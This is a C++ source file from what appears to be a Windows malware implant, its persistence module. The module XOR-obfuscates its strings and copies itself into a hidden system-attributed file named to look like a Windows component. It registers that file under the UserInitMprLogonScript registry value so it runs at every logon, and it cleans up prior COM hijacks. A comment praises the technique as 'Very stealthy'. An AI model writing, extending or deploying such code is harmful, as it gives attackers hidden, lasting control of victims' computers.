#include "Persistence.h"
#include "ComHijacker.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>

namespace persistence {

namespace {
    // Registry Paths & Names (Encrypted)
    // HKCU\Environment
    const wchar_t kEnvKeyEnc[] = { L'E'^0x4B, L'n'^0x1F, L'v'^0x8C, L'i'^0x3E, L'r'^0x4B, L'o'^0x1F, L'n'^0x8C, L'm'^0x3E, L'e'^0x4B, L'n'^0x1F, L't'^0x8C };
    // UserInitMprLogonScript
    const wchar_t kLogonScriptEnc[] = { L'U'^0x4B, L's'^0x1F, L'e'^0x8C, L'r'^0x3E, L'I'^0x4B, L'n'^0x1F, L'i'^0x8C, L't'^0x3E, L'M'^0x4B, L'p'^0x1F, L'r'^0x8C, L'L'^0x3E, L'o'^0x4B, L'g'^0x1F, L'o'^0x8C, L'n'^0x3E, L'S'^0x4B, L'c'^0x1F, L'r'^0x8C, L'i'^0x3E, L'p'^0x4B, L't'^0x1F };
    // Microsoft\Windows\DnsCache
    const wchar_t kSubDirEnc[] = { L'M'^0x4B, L'i'^0x1F, L'c'^0x8C, L'r'^0x3E, L'o'^0x4B, L's'^0x1F, L'o'^0x8C, L'f'^0x3E, L't'^0x4B, L'\\'^0x1F, L'W'^0x8C, L'i'^0x3E, L'n'^0x4B, L'd'^0x1F, L'o'^0x8C, L'w'^0x3E, L's'^0x4B, L'\\'^0x1F, L'D'^0x8C, L'n'^0x3E, L's'^0x4B, L'C'^0x1F, L'a'^0x8C, L'c'^0x3E, L'h'^0x4B, L'e'^0x1F };
    // sppextcomobj.exe
    const wchar_t kExeNameEnc[] = { L's'^0x4B, L'p'^0x1F, L'p'^0x8C, L'e'^0x3E, L'x'^0x4B, L't'^0x1F, L'c'^0x8C, L'o'^0x3E, L'm'^0x4B, L'o'^0x1F, L'b'^0x8C, L'j'^0x3E, L'.'^0x4B, L'e'^0x1F, L'x'^0x8C, L'e'^0x3E };
    // {00021401-0000-0000-C000-000000000046} (Shell Link)
    const wchar_t kBadClsid1Enc[] = { L'{'^0x4B, L'0'^0x1F, L'0'^0x8C, L'0'^0x3E, L'2'^0x4B, L'1'^0x1F, L'4'^0x8C, L'0'^0x3E, L'1'^0x4B, L'-'^0x1F, L'0'^0x8C, L'0'^0x3E, L'0'^0x4B, L'0'^0x1F, L'-'^0x8C, L'0'^0x3E, L'0'^0x4B, L'0'^0x1F, L'0'^0x8C, L'-'^0x3E, L'C'^0x4B, L'0'^0x1F, L'0'^0x8C, L'0'^0x3E, L'-'^0x4B, L'0'^0x1F, L'0'^0x8C, L'0'^0x3E, L'0'^0x4B, L'0'^0x1F, L'0'^0x8C, L'0'^0x3E, L'0'^0x4B, L'0'^0x1F, L'0'^0x8C, L'4'^0x3E, L'6'^0x4B, L'}'^0x1F };
    // {21EC2020-3AEA-1069-A2DD-08002B30309D} (Work Folders)
    const wchar_t kBadClsid2Enc[] = { L'{'^0x4B, L'2'^0x1F, L'1'^0x8C, L'E'^0x3E, L'C'^0x4B, L'2'^0x1F, L'0'^0x8C, L'2'^0x3E, L'0'^0x4B, L'-'^0x1F, L'3'^0x8C, L'A'^0x3E, L'E'^0x4B, L'A'^0x1F, L'-'^0x8C, L'1'^0x3E, L'0'^0x4B, L'6'^0x1F, L'9'^0x8C, L'-'^0x3E, L'A'^0x4B, L'2'^0x1F, L'D'^0x8C, L'D'^0x3E, L'-'^0x4B, L'0'^0x1F, L'8'^0x8C, L'0'^0x3E, L'0'^0x4B, L'2'^0x1F, L'B'^0x8C, L'3'^0x3E, L'0'^0x4B, L'3'^0x1F, L'0'^0x8C, L'9'^0x3E, L'D'^0x4B, L'}'^0x1F };

    std::wstring GetPersistencePath() {
        wchar_t path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            return std::wstring(path) + L"\\" + utils::DecryptW(kSubDirEnc, sizeof(kSubDirEnc)/sizeof(kSubDirEnc[0])) + L"\\" + utils::DecryptW(kExeNameEnc, sizeof(kExeNameEnc)/sizeof(kExeNameEnc[0]));
        }
        return L"";
    }

    bool InstallLogonScript(const std::wstring& implantPath) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kEnvKeyEnc, sizeof(kEnvKeyEnc)/sizeof(kEnvKeyEnc[0])).c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            std::wstring valName = utils::DecryptW(kLogonScriptEnc, sizeof(kLogonScriptEnc)/sizeof(kLogonScriptEnc[0]));
            LSTATUS status = RegSetValueExW(hKey, valName.c_str(), 0, REG_SZ, (LPBYTE)implantPath.c_str(), (DWORD)(implantPath.length() + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
            return status == ERROR_SUCCESS;
        }
        return false;
    }
}

std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
    LOG_INFO("Establishing persistence...");

    // 1. Cleanup all previous bad hijacks to restore system stability
    std::wstring inproc = L"InprocServer32";
    std::wstring localSrv = L"LocalServer32";
    ComHijacker::Uninstall(utils::DecryptW(kBadClsid1Enc, sizeof(kBadClsid1Enc)/sizeof(kBadClsid1Enc[0])), inproc);
    ComHijacker::Uninstall(utils::DecryptW(kBadClsid2Enc, sizeof(kBadClsid2Enc)/sizeof(kBadClsid2Enc[0])), localSrv);
    ComHijacker::Uninstall(utils::DecryptW(kBadClsid2Enc, sizeof(kBadClsid2Enc)/sizeof(kBadClsid2Enc[0])), inproc);

    std::wstring targetPath = GetPersistencePath();
    if (targetPath.empty()) return L"";

    wchar_t currentPath[MAX_PATH];
    if (overrideSourcePath.empty()) {
        if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) return L"";
    } else {
        wcscpy(currentPath, overrideSourcePath.c_str());
    }

    if (_wcsicmp(currentPath, targetPath.c_str()) != 0) {
        std::wstring dir = targetPath.substr(0, targetPath.find_last_of(L"\\"));

        // Create directories recursively
        size_t pos = 0;
        while ((pos = dir.find(L"\\", pos + 1)) != std::wstring::npos) {
            std::wstring sub = dir.substr(0, pos);
            CreateDirectoryW(sub.c_str(), NULL);
        }
        CreateDirectoryW(dir.c_str(), NULL);

        if (!CopyFileW(currentPath, targetPath.c_str(), FALSE)) {
            LOG_ERR("Failed to copy binary to persistence path: " + utils::ws2s(targetPath));
        } else {
            SetFileAttributesW(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    }

    // Method: UserInitMprLogonScript (Very stealthy, triggers on logon)
    if (InstallLogonScript(targetPath)) {
        LOG_INFO("Logon Script persistence success.");
    }

    return targetPath;
}

void ReinstallPersistence() {
    establishPersistence();
}

} // namespace persistence
